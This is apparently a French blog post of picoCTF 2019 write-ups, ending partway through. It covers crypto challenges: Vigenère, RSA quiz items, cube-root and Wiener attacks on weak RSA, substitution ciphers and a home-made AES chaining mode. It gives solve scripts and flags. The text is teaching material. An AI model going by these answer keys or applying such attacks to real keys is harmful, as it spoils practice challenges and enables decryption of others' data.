---
layout: post
title: "picoCTF-2019 - Writeups"
categories:
excerpt_separator:  <!--more-->
---
<!--more-->

<details><summary><h3 style="display: inline;">Menu</h3></summary><ul>
<li><a href="#crypto_200_LaCifraDe">crypto_200_LaCifraDe</a></li>
<li><a href="#crypto_200_RsaPopQuiz">crypto_200_RsaPopQuiz</a></li>
<li><a href="#crypto_200_Mr-worlwide">crypto_200_Mr-worlwide</a></li>
<li><a href="#crypto_300_WavesOverLambda">crypto_300_WavesOverLambda</a></li>
<li><a href="#crypto_300_miniRSA">crypto_300_miniRSA</a></li>
<li><a href="#crypto_300_waves_over_lambda">crypto_300_waves_over_lambda </a></li>
<li><a href="#crypto_400_aes_abc">crypto_400_aes_abc</a></li>
<li><a href="#crypto_400_b00tl3gRSA2">crypto_400_b00tl3gRSA2</a></li>
<li><a href="#forensics_150_what_lies_within">forensics_150_what_lies_within</a></li>
<li><a href="#forensic_250_c0rrupt">forensic_250_c0rrupt</a></li>
<li><a href="#forensics_250_like1000">forensics_250_like1000</a></li>
<li><a href="#forensics_250_m00nwalk">forensics_250_m00nwalk</a></li>
<li><a href="#forensics_300_m00nwalk2">forensics_300_m00nwalk2</a></li>
<li><a href="#forensics_300_shark_on_wire_2">forensics_300_shark_on_wire_2</a></li>
<li><a href="#forensics_350_WebNet0">forensics_350_WebNet0</a></li>
<li><a href="#forensic_350_investigative_reversing_2">forensic_350_investigative_reversing_2</a></li>
<li><a href="#forensic_350_pasta111">forensic_350_pasta111</a></li>
<li><a href="#forensic_400_investigative_reversing_3">forensic_400_investigative_reversing_3</a></li>
<li><a href="#forensic_400_investigative_reversing_4">forensic_400_investigative_reversing_4</a></li>
<li><a href="#forensics_450_WebNet1">forensics_450_WebNet1</a></li>
<li><a href="#forensic_450_investigation_encoded_1">forensic_450_investigation_encoded_1</a></li>
<li><a href="#forensic_500_investigation_encoded_2">forensic_500_investigation_encoded_2</a></li>
<li><a href="#pwn_050_Handy_shellcode">pwn_050_Handy_shellcode</a></li>
<li><a href="#pwn_100_OverFlow_0">pwn_100_OverFlow_0</a></li>
<li><a href="#pwn_200_slippery_shellcode">pwn_200_slippery_shellcode</a></li>
<li><a href="#reverse_300_droids0">reverse_300_droids0</a></li>
<li><a href="#reverse_300_reverse_cipher">reverse_300_reverse_cipher</a></li>
<li><a href="#reverse_350_droids1">reverse_350_droids1</a></li>
<li><a href="#reverse_400_droids2">reverse_400_droids2</a></li>
<li><a href="#reverse_400_need_for_speed">reverse_400_need_for_speed</a></li>
<li><a href="#reverse_400_times_up">reverse_400_times_up</a></li>
<li><a href="#reverse_450_droids3">reverse_450_droids3</a></li>
<li><a href="#reverse_500_droids4">reverse_500_droids4</a></li>
<li><a href="#web_100_dont-use-client-side">web_100_dont-use-client-side</a></li>
<li><a href="#web_100_where_are_the_robots">web_100_where_are_the_robots</a></li>
<li><a href="#web_200_client-side-again">web_200_client-side-again</a></li>
<li><a href="#web_250_open-to-admins">web_250_open-to-admins</a></li>
<li><a href="#web_400_Empire1">web_400_Empire1</a></li>
<li><a href="#web_400_Irish-Name-Repo_3">web_400_Irish-Name-Repo_3</a></li>
<li><a href="#web_400_Java_Script_Kiddie">web_400_Java_Script_Kiddie</a></li>
<li><a href="#web_450_Empire2">web_450_Empire2</a></li>
<li><a href="#web_450_Java_Script_Kiddie_2">web_450_Java_Script_Kiddie_2</a></li>
<li><a href="#web_450_cereal_hacker_1">web_450_cereal_hacker_1</a></li>
<li><a href="#web_500_Empire3">web_500_Empire3</a></li>
<li><a href="#web_500_cereal_hacker_2">web_500_cereal_hacker_2</a></li>
</ul></details>

# crypto_200_LaCifraDe

------

### Titre : La Cifra De

### Points : 200

------

### Description

------

Connectez-vous sur `nc 2019shell1.picoctf.com 39776`

#### Hints

* There are tools that make this easy.
* Perhaps looking at history will help

------

### Résolution

---

Lors de la connexion netcat, le serveur nous envoie ce texte chiffré :

```
Encrypted message:
Ne iy nytkwpsznyg nth it mtsztcy vjzprj zfzjy rkhpibj nrkitt ltc tnnygy ysee itd tte cxjltk

Ifrosr tnj noawde uk siyyzre, yse Bnretèwp Cousex mls hjpn xjtnbjytki xatd eisjd

Iz bls lfwskqj azycihzeej yz Brftsk ip Volpnèxj ls oy hay tcimnyarqj dkxnrogpd os 1553 my Mnzvgs Mazytszf Merqlsu ny hox moup Wa inqrg ipl. Ynr. Gotgat Gltzndtg Gplrfdo 

Ltc tnj tmvqpmkseaznzn uk ehox nivmpr g ylbrj ts ltcmki my yqtdosr tnj wocjc hgqq ol fy oxitngwj arusahje fuw ln guaaxjytrd catizm tzxbkw zf vqlckx hizm ceyupcz yz tnj fpvjc hgqqpohzCZK{m311a50_0x_a1rn3x3_h1ah3x1119h336}

Ehk ktryy herq-ooizxetypd jjdcxnatoty ol f aordllvmlbkytc inahkw socjgex, bls sfoe gwzuti 1467 my Rjzn Hfetoxea Gqmexyt.

Tnj Gimjyèrk Htpnjc iy ysexjqoxj dosjeisjd cgqwej yse Gqmexyt Doxn ox Fwbkwei Inahkw.

Tn 1508, Ptsatsps Zwttnjxiax tnbjytki ehk xz-cgqwej ylbaql rkhea (g rltxni ol xsilypd gqahggpty) ysaz bzuri wazjc bk f nroytcgq nosuznkse ol yse Bnretèwp Cousex.

Gplrfdo’y xpcuso butvlky lpvjlrki tn 1555 gx l cuseitzltoty ol yse lncsz. Yse rthex mllbjd ol yse gqahggpty fce tth snnqtki cemzwaxqj, bay ehk fwpnfmezx lnj yse osoed qptzjcs gwp mocpd hd xegsd ol f xnkrznoh vee usrgxp, wnnnh ify bk itfljcety hizm paim noxwpsvtydkse.
```

En analysant un peu le chiffré ci-dessus :

* On peut apercevoir la présence de *pohzCZK{m311a50_0x_a1rn3x3_h1ah3x1119h336}*. Cette partie correspond très probablement au flag avec pohzCZK = picoCTF.
* On réfute l'idée d'un chiffrement de substitution alphabétique car les 2 'c' ne possèdent pas le même chiffré.
* Par contre, la répétition de la chaîne de caractère 'ol', nous fait penser à un chiffrement de Vigenère.

Méthode d'attaque :

* Attaque par clair connu : *modèle d'attaque en cryptanalyse où l'attaquant possède à la fois le texte chiffré et un texte clair*.
* Portion texte connu : pohzCZK
* Clef calculé à partir de cette partie : AGFLAGF

Le site www.dcode.fr avec la clef FLAG ne déchiffre clairement que la première partie du texte. En effet, la clef a été décalé : FLAG, LAGF, AGFL, GFLA.

On va donc lancer le déchiffrement avec ces clefs et concaténer chaque partie déchiffrer convenablement :

```
It is interesting how in history people often receive credit for things they did not create

During the course of history, the Vigenere Cipher has been reinvented many times

It was falsely attributed to Blaise de Vigenere as it was originally described in 1553 by Giovan Battista Bellaso in his book La cifra del. Sig. Giovan Battista Bellaso

For the implementation of this cipher a table is formed by sliding the lower half of an ordinary alphabet for an apparently random number of places with respect to the upper halfpicoCTF{b311a50_0r_v1gn3r3_c1ph3r1119c336}

[ ... ]
```

`picoCTF{b311a50_0r_v1gn3r3_c1ph3r1119c336}`

# crypto_200_RsaPopQuiz

------

### Titre : Rsa Pop Quiz

### Points : 200

------

### Description

------

Class, take your seats! It's PRIME-time for a quiz...

Connectez-vous sur `nc 2019shell1.picoctf.com 30962`

#### Hints

* https://simple.wikipedia.org/wiki/RSA_algorithm

------

### Résolution

---


```bash
$ nc 2019shell1.picoctf.com 30962
Good morning class! Its me Ms. Adleman-Shamir-Rivest
Today we will be taking a pop quiz, so I hope you studied. Cramming just will not do!
You will need to tell me if each example is possible, given your extensive crypto knowledge.
Inputs and outputs are in decimal. No hex here!
```

On se retrouve avec une série de problèmes comportant des données.
Il faut dire si les données peuvent suffire à résoudre le problème. Si c'est le cas, il faudra alors le résoudre.

Problème 1 : Trouver N.

* q : 60413
* p : 76753

> N = p x q donc c'est possible.

```python
> 60413*76753
4636878989
```



Problème 2 : Trouver q.

* N : 5051846941
* p : 54269

> q = N/p donc c'est possible.

```python
> 5051846941//54269
93089
```



Problème 3 : Trouver N.

* e : 3
* N : 12738162802910546503821920886905393316386362759567480839428456525224226445173031635306683726182522494910808518920409019414034814409330094245825749680913204566832337704700165993198897029795786969124232138869784626202501366135975223827287812326250577148625360887698930625504334325804587329905617936581116392784684334664204309771430814449606147221349888320403451637882447709796221706470239625292297988766493746209684880843111138170600039888112404411310974758532603998608057008811836384597579147244737606088756299939654265086899096359070667266167754944587948695842171915048619846282873769413489072243477764350071787327913

> Impossible de retrouver p et q.



Problème 4 : Trouver phi.

* q : 66347
* p : 12611

> phi = (p-1)x(q-1) donc c'est possible.

```python
> (66347-1)*(12611-1)
836623060
```



Problème 5 : Trouve le chiffré.

* m : 6357294171489311547190987615544575133581967886499484091352661406414044440475205342882841236357665973431462491355089413710392273380203038793241564304774271529108729717
* e : 3
* N : 29129463609326322559521123136222078780585451208149138547799121083622333250646678767769126248182207478527881025116332742616201890576280859777513414460842754045651093593251726785499360828237897586278068419875517543013545369871704159718105354690802726645710699029936754265654381929650494383622583174075805797766685192325859982797796060391271817578087472948205626257717479858369754502615173773514087437504532994142632207906501079835037052797306690891600559321673928943158514646572885986881016569647357891598545880304236145548059520898133142087545369179876065657214225826997676844000054327141666320553082128424707948750331

> c = m^e mod N donc c'est possible.

```python
> m**e % N
256931246631782714357241556582441991993437399854161372646318659020994329843524306570818293602492485385337029697819837182169818816821461486018802894936801257629375428544752970630870631166355711254848465862207765051226282541748174535990314552471546936536330397892907207943448897073772015986097770443616540466471245438117157152783246654401668267323136450122287983612851171545784168132230208726238881861407976917850248110805724300421712827401063963117423718797887144760360749619552577176382615108244813
```



Problème 6 : Trouve le message.

* c : 107524013451079348539944510756143604203925717262185033799328445011792760545528944993719783392542163428637172323512252624567111110666168664743115203791510985709942366609626436995887781674651272233566303814979677507101168587739375699009734588985482369702634499544891509228440194615376339573685285125730286623323
* e : 3
* N : 27566996291508213932419371385141522859343226560050921196294761870500846140132385080994630946107675330189606021165260590147068785820203600882092467797813519434652632126061353583124063944373336654246386074125394368479677295167494332556053947231141336142392086767742035970752738056297057898704112912616565299451359791548536846025854378347423520104947907334451056339439706623069503088916316369813499705073573777577169392401411708920615574908593784282546154486446779246790294398198854547069593987224578333683144886242572837465834139561122101527973799583927411936200068176539747586449939559180772690007261562703222558103359

> Il est théoriquement impossible de retrouver le clair à partir du chiffré et de la clef publique.



Problème 7 : Trouve l'exposant privé.

* q : 92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559
* p : 97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637
* e : 65537

> d = e^-1 mod phi avec phi = (p-1)x(q-1) donc c'est possible.

```python
> import gmpy2
> gmpy2.invert(e, (p-1)*(q-1))
mpz(1405046269503207469140791548403639533127416416214210694972085079171787580463776820425965898174272870486015739516125786182821637006600742140682552321645503743280670839819078749092730110549881891271317396450158021688253989767145578723458252769465545504142139663476747479225923933192421405464414574786272963741656223941750084051228611576708609346787101088759062724389874160693008783334605903142528824559223515203978707969795087506678894006628296743079886244349469131831225757926844843554897638786146036869572653204735650843186722732736888918789379054050122205253165705085538743651258400390580971043144644984654914856729)
```



Problème 8 : Trouve le message en clair.

* c : 23016653876847472700856653975636134833816267659423093220825802730311792688015526031010185862796820464000740538663367868273628190558574669769926145909966799940743138330542504400318814444877763931323239980099404303323064601116168860363364840864265724602533013776878867287027908763538326145208488830881872675088750689066949453757107611076477999369848061893166820131477255959664458909576462597878213732662606021276850039344887619097192724271061026030900796808157479658550935169474101799591059725002019677640101543801616541273658841153594862740548434726220958512298690110880142486139412015047636595600919146971517653734739
* p : 153143042272527868798412612417204434156935146874282990942386694020462861918068684561281763577034706600608387699148071015194725533394126069826857182428660427818277378724977554365910231524827258160904493774748749088477328204812171935987088715261127321911849092207070653272176072509933245978935455542420691737433
* e : 65537
* N : 23952937352643527451379227516428377705004894508566304313177880191662177061878993798938496818120987817049538365206671401938265663712351239785237507341311858383628932183083145614696585411921662992078376103990806989257289472590902167457302888198293135333083734504191910953238278860923153746261500759411620299864395158783509535039259714359526738924736952759753503357614939203434092075676169179112452620687731670534906069845965633455748606649062394293289967059348143206600765820021392608270528856238306849191113241355842396325210132358046616312901337987464473799040762271876389031455051640937681745409057246190498795697239

> C'est possible. Étapes à suivre :
>
> * Retrouver q à partir de N et p
> * Retrouver d à partir de e, p et q
> * Retrouver m à partir de c, d et N

```python
> from gmpy2 import invert, mpz
> N = 23952937352643527451379227516428377705004894508566304313177880191662177061878993798938496818120987817049538365206671401938265663712351239785237507341311858383628932183083145614696585411921662992078376103990806989257289472590902167457302888198293135333083734504191910953238278860923153746261500759411620299864395158783509535039259714359526738924736952759753503357614939203434092075676169179112452620687731670534906069845965633455748606649062394293289967059348143206600765820021392608270528856238306849191113241355842396325210132358046616312901337987464473799040762271876389031455051640937681745409057246190498795697239
> e = 65537
> p = 153143042272527868798412612417204434156935146874282990942386694020462861918068684561281763577034706600608387699148071015194725533394126069826857182428660427818277378724977554365910231524827258160904493774748749088477328204812171935987088715261127321911849092207070653272176072509933245978935455542420691737433
> c = 23016653876847472700856653975636134833816267659423093220825802730311792688015526031010185862796820464000740538663367868273628190558574669769926145909966799940743138330542504400318814444877763931323239980099404303323064601116168860363364840864265724602533013776878867287027908763538326145208488830881872675088750689066949453757107611076477999369848061893166820131477255959664458909576462597878213732662606021276850039344887619097192724271061026030900796808157479658550935169474101799591059725002019677640101543801616541273658841153594862740548434726220958512298690110880142486139412015047636595600919146971517653734739
> q = N//p
> d = invert(e, (p-1)*(q-1))
> print(int(pow(mpz(c), d, N)))
14311663942709674867122208214901970650496788151239520971623411712977119770832428664762753917
```



La dernière réponse du serveur : *If you convert the last plaintext to a hex number, then ascii, you'll find what you need! ;)*

Il nous suffit donc de traduire les digits en ASCII.

`picoCTF{wA8_th4t$_ill3aGal..o8227181c}`

# crypto_200_Mr-worlwide

------

### Titre : Mr-worlwide

### Points : 200

------

### Description

------

A musician left us a [message](https://2019shell1.picoctf.com/static/46e165b0a953075440f3a544fdb4cff1/message.txt). What's it mean?	

------

### Résolution

---

On a une liste de positions :
`picoCTF{(35.028309, 135.753082)(46.469391, 30.740883)(39.758949, -84.191605)(41.015137, 28.979530)(24.466667, 54.366669)(3.140853, 101.693207)_(9.005401, 38.763611)(-3.989038, -79.203560)(52.377956, 4.897070)(41.085651, -73.858467)(57.790001, -152.407227)(31.205753, 29.924526)}`

Chaque couple de valeurs correspond a une position GPS : 

```
(35.028309, 135.753082)   Nakanocho, Kamigyō-ku, Kyoto, Préfecture de Kyoto, Japon
(46.469391, 30.740883)    Odessa, Ukraine, 65000
(39.758949, -84.191605)   Dayton, OH 45402, États-Unis
(41.015137, 28.979530)    Istanbul, Hoca Paşa, 34110 Fatih/Istanbul, Turquie
(24.466667, 54.366669)    Hazza Bin Zayed the First St - Abu Dhabi - Émirats arabes unis
(3.140853, 101.693207)    Unnamed Road, 50480 Kuala Lumpur, Federal Territory of Kuala Lumpur, Malaisie
_
(9.005401, 38.763611)     Unnamed Road, Addis Ababa, Éthiopie
(-3.989038, -79.203560)   Av Nueva Loja, Loja, Équateur
(52.377956, 4.897070)     Martelaarsgracht 5, 1012 TN Amsterdam, Pays-Bas
(41.085651, -73.858467)   34PR+7J Sleepy Hollow, État de New York, États-Unis
(57.790001, -152.407227)  QHRV+24 Kodiak, Alaska, États-Unis
(31.205753, 29.924526)    Faculty Of Engineering, Al Azaritah WA Ash Shatebi, Qism Bab Sharqi, Alexandria Governorate, Égypte
```

On prend ensuite la première lettre de chaque ville et on a le flag.

`picoCTF{KODIAK_ALASKA}`

# crypto_300_WavesOverLambda

------

### Titre : Waves Over Lambda

### Points : 300

------

### Description

We made a lot of substitutions to encrypt this. Can you decrypt it?

---

Connectez-vous sur `nc 2019shell1.picoctf.com 45185`

#### Hints

* Flag is not in the usual flag format

------

### Résolution

---

Lors de la connexion netcat, le serveur nous envoie ce texte chiffré :

```
-------------------------------------------------------------------------------
kftxgycs laga ms ofjg bdyx - bgaijatko_ms_k_fzag_dyhnwy_hjuxuattfw
-------------------------------------------------------------------------------
lyzmtx lyw sfha cmha yc ho wmsufsyd vlat mt dftwft, m lyw zmsmcaw cla ngmcmsl hjsajh, ytw hywa saygkl yhftx cla nffqs ytw hyus mt cla dmngygo gaxygwmtx cgytsodzytmy; mc lyw scgjkq ha clyc sfha bfgaqtfvdawxa fb cla kfjtcgo kfjdw lygwdo bymd cf lyza sfha mhufgcytka mt waydmtx vmcl y tfndahyt fb clyc kfjtcgo. m bmtw clyc cla wmscgmkc la tyhaw ms mt cla aecgaha aysc fb cla kfjtcgo, pjsc ft cla nfgwags fb clgaa scycas, cgytsodzytmy, hfdwyzmy ytw njqfzmty, mt cla hmwsc fb cla kyguyclmyt hfjtcymts; fta fb cla vmdwasc ytw daysc qtfvt ufgcmfts fb ajgfua. m vys tfc ynda cf dmxlc ft yto hyu fg vfgq xmzmtx cla aeykc dfkydmco fb cla kyscda wgykjdy, ys claga yga tf hyus fb clms kfjtcgo ys oac cf kfhuyga vmcl fjg fvt fgwtytka sjgzao hyus; njc m bfjtw clyc nmscgmcr, cla ufsc cfvt tyhaw no kfjtc wgykjdy, ms y bymgdo vadd-qtfvt udyka. m slydd atcag laga sfha fb ho tfcas, ys clao hyo gabgasl ho hahfgo vlat m cydq fzag ho cgyzads vmcl hmty.
```

En analysant un peu le chiffré ci-dessus :

* On aperçoit la répétition de mot 'fb', ce qui nous fait penser d'un chiffrement de substitution alphabétique.
* On pourrait aussi utiliser l'indice de coïncidence de la langue manipulée

Indice de coïncidence : *indicateur utilisé en cryptanalyse qui permet d'évaluer la répartition  globale des lettres dans un message chiffré pour un alphabet donné*.

Méthode d'attaque sur cette hypothèse :

* Analyse fréquentielle : *consiste à examiner la fréquence des lettres employées dans un message chiffré*.
* Utilisation du site quipqiup.com.

Après une première analyse sans donner d'indice :

```
------------------------------------------------------------------------------- 
congrats here is yo?r flag - fre??ency_is_c_over_lam?da_m??g?ennod 
------------------------------------------------------------------------------- 
having had some time at my dis?osal when in london, i had visited the ?ritish m?se?m, and made search among the ?ooks and ma?s in the li?rary regarding transylvania; it had str?ck me that some foreknowledge of the co?ntry co?ld hardly fail to have some im?ortance in dealing with a no?leman of that co?ntry. i find that the district he named is in the extreme east of the co?ntry, ??st on the ?orders of three states, transylvania, moldavia and ??kovina, in the midst of the car?athian mo?ntains; one of the wildest and least known ?ortions of e?ro?e. i was not a?le to light on any ma? or work giving the exact locality of the castle drac?la, as there are no ma?s of this co?ntry as yet to com?are with o?r own ordnance s?rvey ma?s; ??t i fo?nd that ?istrit?, the ?ost town named ?y co?nt drac?la, is a fairly well-known ?lace. i shall enter here some of my notes, as they may refresh my memory when i talk over my travels with mina.
```

On va donner des indices qu'on peut deviner de nous-mêmes grâce au résultat précédent.

* CLUE : J=U N=B U=P I=Q


```
------------------------------------------------------------------------------- 
congrats here is your flag - frequency_is_c_over_lambda_mupgpennod 
------------------------------------------------------------------------------- 
having had some time at my disposal when in london, i had visited the british museum, and made search among the books and maps in the library regarding transylvania; it had struck me that some foreknowledge of the country could hardly fail to have some importance in dealing with a nobleman of that country. i find that the district he named is in the extreme east of the country, ?ust on the borders of three states, transylvania, moldavia and bukovina, in the midst of the carpathian mountains; one of the wildest and least known portions of europe. i was not able to light on any map or work giving the exact locality of the castle dracula, as there are no maps of this country as yet to compare with our own ordnance survey maps; but i found that bistrit?, the post town named by count dracula, is a fairly well-known place. i shall enter here some of my notes, as they may refresh my memory when i talk over my travels with mina.
```

`picoCTF{frequency_is_c_over_lambda_mupgpennod}`

# crypto_300_miniRSA

------

### Titre : miniRSA

### Points : 300

------

### Description

Let's decrypt this: [ciphertext](https://2019shell1.picoctf.com/static/889f28a17cdec635235c1a24b60221be/ciphertext)? Something seems a bit small

---

#### Hints

* https://en.wikipedia.org/wiki/RSA_(cryptosystem)
* How could having too small an e affect the security of this 2048 bit key?
* Make sure you don't lose precision, the numbers are pretty big (besides the e value)

------

### Résolution

---

```bash
$ file ciphertext
ciphertext: ASCII text, with very long lines
$ cat ciphertext
N: 29331922499794985782735976045591164936683059380558950386560160105740343201513369939006307531165922708949619162698623675349030430859547825708994708321803705309459438099340427770580064400911431856656901982789948285309956111848686906152664473350940486507451771223435835260168971210087470894448460745593956840586530527915802541450092946574694809584880896601317519794442862977471129319781313161842056501715040555964011899589002863730868679527184420789010551475067862907739054966183120621407246398518098981106431219207697870293412176440482900183550467375190239898455201170831410460483829448603477361305838743852756938687673
e: 3

ciphertext (c): 2205316413931134031074603746928247799030155221252519872650101242908540609117693035883827878696406295617513907962419726541451312273821810017858485722109359971259158071688912076249144203043097720816270550387459717116098817458584146690177125
```

Lors du chiffrement avec un exposant public faible et un message m de faible valeur (m < n/e), il y a pour conséquence que le chiffrement soit inférieur au modulus : m^e < n. 
Dans ce cas, le texte chiffré pourra être facilement déchiffré en prenant la racine de e de ce texte.

* Script cherchant la racine au cube du texte chiffré :

```python
def find_cube_root(n):
   low = 0
   high = n
   while low < high:
       mid = (low+high)//2
       if mid**3 < n:
           low = mid+1
       else:
           high = mid
   m = str(hex(low))[2::]
   print(''.join([chr(int(''.join(c), 16)) for c in zip(m[0::2],m[1::2])]))
find_cube_root(2205316413931134031074603746928247799030155221252519872650101242908540609117693035883827878696406295617513907962419726541451312273821810017858485722109359971259158071688912076249144203043097720816270550387459717116098817458584146690177125)
```
`picoCTF{n33d_a_lArg3r_e_ff7cfba1}`



# crypto_300_waves_over_lambda 

------

### Titre : waves-over-lambda 
### Points : 300

------

### Description 

Nous avons fait beaucoup de substitutions pour chiffrer cela. Pouvez-vous le déchiffrer ?
Connectez-vous sur  `nc 2019shell1.picoctf.com 4164`

------

#### Hints

* Le Flag n'est pas dans le format habituel. 

------

### Résolution
Le serveur me renvoi le message ci-dessous. 
```bash
$ nc 2019shell1.picoctf.com 4164
-------------------------------------------------------------------------------
evinptbm djpj um svxp wgtn - wpjyxjies_um_e_vojp_gtkaht_euokajujko
-------------------------------------------------------------------------------
dtouin dth mvkj bukj tb ks humfvmtg cdji ui gvihvi, u dth oumubjh bdj apubumd kxmjxk, tih kthj mjtped tkvin bdj avvzm tih ktfm ui bdj guaptps pjntphuin bptimsgotiut; ub dth mbpxez kj bdtb mvkj wvpjzivcgjhnj vw bdj evxibps evxgh dtphgs wtug bv dtoj mvkj ukfvpbtiej ui hjtguin cubd t ivagjkti vw bdtb evxibps. u wuih bdtb bdj humbpueb dj itkjh um ui bdj jqbpjkj jtmb vw bdj evxibps, lxmb vi bdj avphjpm vw bdpjj mbtbjm, bptimsgotiut, kvghtout tih axzvouit, ui bdj kuhmb vw bdj etpftbduti kvxibtuim; vij vw bdj cughjmb tih gjtmb zivci fvpbuvim vw jxpvfj. u ctm ivb tagj bv gundb vi tis ktf vp cvpz nuouin bdj jqteb gvetgubs vw bdj etmbgj hptexgt, tm bdjpj tpj iv ktfm vw bdum evxibps tm sjb bv evkftpj cubd vxp vci vphitiej mxpojs ktfm; axb u wvxih bdtb aumbpubr, bdj fvmb bvci itkjh as evxib hptexgt, um t wtupgs cjgg-zivci fgtej. u mdtgg jibjp djpj mvkj vw ks ivbjm, tm bdjs kts pjwpjmd ks kjkvps cdji u btgz vojp ks bptojgm cubd kuit.
...
```
Dans la description nous savons que c'est plusieurs substitutions qui ont été effectuer sur le message initial qui contient donc notre flag, je me lance alors à la recherche des algorithmes de décodage de substitution et l'un d'eux est l'analyse fréquentielle. Par exemple, la lettre la plus courante en anglais et français est E, la lettre la plus courante dans le texte crypté est donc probablement la substitution de E. J'utilise donc le site [https://planetcalc.com/8047/](https://planetcalc.com/8047/) qui implémente un bon algorithme utilisaant le principe de la génétique pour trouver la clé de substution utilisée.

![alt text](https://raw.githubusercontent.com/Amadimk/PICO2019-CTF/master/waves.png)


Le Flag est : 
`picoCTF{bad_1d3a5_4986370}`


# crypto_400_aes_abc

------

### Titre : AES-ABC

### Points : 400

------

### Description

------

AES-ECB is bad, so I rolled my own cipher block chaining mechanism - Addition Block Chaining! You can find the source here: aes-abc.py. The AES-ABC flag is body.enc.ppm

#### Hints

* You probably want to figure out what the flag looks like in ECB form...

------

### Résolution

---

```bash
$ file body.enc.ppm 
body.enc.ppm: Netpbm image data, size = 1895 x 820, rawbits, pixmap
```

Dans `aes-abc.py`, c'est le chiffrement AES-ECB qui est utilisé.

> The simplest of the encryption modes is the Electronic Codebook (ECB) mode (named after conventional physical codebooks). The message is divided into blocks, and each block is encrypted separately.  (Wikipedia)

Le mode ECB est facile à attaquer.

```python
# aes-abc.py
def aes_abc_encrypt(pt):
    cipher = AES.new(KEY, AES.MODE_ECB)
    ct = cipher.encrypt(pad(pt))

    blocks = [ct[i * BLOCK_SIZE:(i+1) * BLOCK_SIZE] for i in range(len(ct) / BLOCK_SIZE)]
    iv = os.urandom(16)
    blocks.insert(0, iv)
    
    for i in range(len(blocks) - 1):
        prev_blk = int(blocks[i].encode('hex'), 16)
        curr_blk = int(blocks[i+1].encode('hex'), 16)

        n_curr_blk = (prev_blk + curr_blk) % UMAX
        blocks[i+1] = to_bytes(n_curr_blk)

    ct_abc = "".join(blocks)
 
    return iv, ct_abc, ct
```

```python
# aes-abc_patched.py
def aes_abc_encrypt(pt):
    ct = pad(pt)

    blocks = [ct[i * BLOCK_SIZE:(i+1) * BLOCK_SIZE] for i in range(len(ct) / BLOCK_SIZE)]
    iv = os.urandom(16)
    blocks.insert(0, iv)
    
    test = list(blocks)
    for i in range(len(blocks) - 1):
        prev_blk = int(test[i].encode('hex'), 16)
        curr_blk = int(blocks[i+1].encode('hex'), 16)

        n_curr_blk = (curr_blk - prev_blk) % UMAX
        blocks[i+1] = to_bytes(n_curr_blk)

    ct_abc = "".join(blocks)
 
    return iv, ct_abc, ct

if __name__=="__main__":
    with open('body.enc.ppm', 'rb') as f:
        header, data = parse_header_ppm(f)
    
    iv, c_img, ct = aes_abc_encrypt(data)

    with open('body.dec.ppm', 'wb') as fw:
        fw.write(header)
        fw.write(c_img)
```

On doit juste comprendre le chiffrement et inverser le chiffrement pour déchiffrer. On exécute et on peut voir le flag sur l'image.

`picoCTF{d0Nt_r0ll_yoUr_0wN_aES}`

# crypto_400_b00tl3gRSA2

------

### Titre : B00tl3gRSA2

### Points : 400

------

### Description

In RSA d is a lot bigger than e, why don't we use d to encrypt instead of e ?

---

Connectez-vous sur `nc 2019shell1.picoctf.com 1723`

#### Hints

* What is e generally?

------

### Résolution

---

```bash
$ nc 2019shell1.picoctf.com 1723
c: 12799267366578245460090107813991913234250219819928939944932512748001008336364043700007306744934958582934300952098920361517640986375792081693755571700466428919116291361852953951145864971276848212661514792085419149615156655272066275262712828202027608430310538957716807879880354335872305034011133666376788443987
n: 74250966958507921051625216758984587597148135882200278282055368693416179049334546986821754703505041395601145398790071820445075797236535326599362635119309137183136787903354293017064238317105822411647252527637303583049262741151903298758443779187235787140712207411062126015664419732894263786658852152909780636539
e: 52039236070283745513881463237158858011691230561991290142230605533149090377863411694137614432174093433980069433407473318227615263418657256532369875891482772898344537549874685493925920839175829685452689996376967422044122205512656594396090131590673736994883711940171516189219734404394044363937179518991742390689
```

Hypothèse : En voyant l'exposant e avec une telle taille, tout nous laisserait croire que le calcul des exposants pourrait avoir été inversé. Ce qui aurait pour conséquence d'avoir un d de très faible taille.
Cette hypothèse semble très fortement confirmé par la description du challenge.

On va tenter de procéder à une Wiener attaque.
*L’attaque de Wiener est une attaque cryptographique contre le chiffrement RSA, utilisable lorsque d'une part l'exposant privé d est faible, et d'autre part les deux nombres premiers secrets p et q utilisés pour fournir le module de chiffrement public (qui en est le produit normalement difficilement décomposable) sont trop proches.*



* RSACtfTools a une fonction permettant la Wiener Attack :

```bash
# Génération de la clef publique à partir des paramètres de la clef publique
$ RsaCtfTool/RsaCtfTool.py --createpub -n 74250966958507921051625216758984587597148135882200278282055368693416179049334546986821754703505041395601145398790071820445075797236535326599362635119309137183136787903354293017064238317105822411647252527637303583049262741151903298758443779187235787140712207411062126015664419732894263786658852152909780636539 -e 52039236070283745513881463237158858011691230561991290142230605533149090377863411694137614432174093433980069433407473318227615263418657256532369875891482772898344537549874685493925920839175829685452689996376967422044122205512656594396090131590673736994883711940171516189219734404394044363937179518991742390689 > pub_key.pem
$ cat pub_key.pem
-----BEGIN PUBLIC KEY-----
MIIBHjANBgkqhkiG9w0BAQEFAAOCAQsAMIIBBgKBgGm8pJwv6Dkf7SDwkfTpD7n6
as3eNGQGbXIdhm76Ts7F4wOo/WZf/cp22ZNXlMvZvsnrDgztJU4Cnn4u8bDRzkfR
se3LcXtY6SUY3Yhp7L9XhHwuB5ZQyZtY4O/G5s8DHxKa8Jt3c9Ruf+IG5bzkRMvl
2YuBXSfXE8ut2tfXElN7AoGAShs4k27QJxlFLMzuvuOJbiMgL+EIfwIyOsSOr8Em
8qymiq4py1KDoR7jJu0/EBAwM3xWgKDEgIQ9aNql8fNZyvqSlaEx49SjvvrRKY1q
gj3Ob27SxxAXu3GFVZggVbA9lCM0bCazD+x51wdJDEPp7SP1uCz58T3on+VY0nsh
0aE=
-----END PUBLIC KEY-----

# Calcul la clef privée grâce à RsaCtfTools : Wiener Attack
$ RsaCtfTool/RsaCtfTool.py --publickey pub_key.pem --verbose --private
[*] Performing hastads attack.
[*] Performing prime_n attack.
[*] Performing factordb attack.
[*] Performing pastctfprimes attack.
[*] Loaded 71 primes
[*] Performing mersenne_primes attack.
[*] Performing noveltyprimes attack.
[*] Performing smallq attack.
[*] Performing wiener attack.
-----BEGIN RSA PRIVATE KEY-----
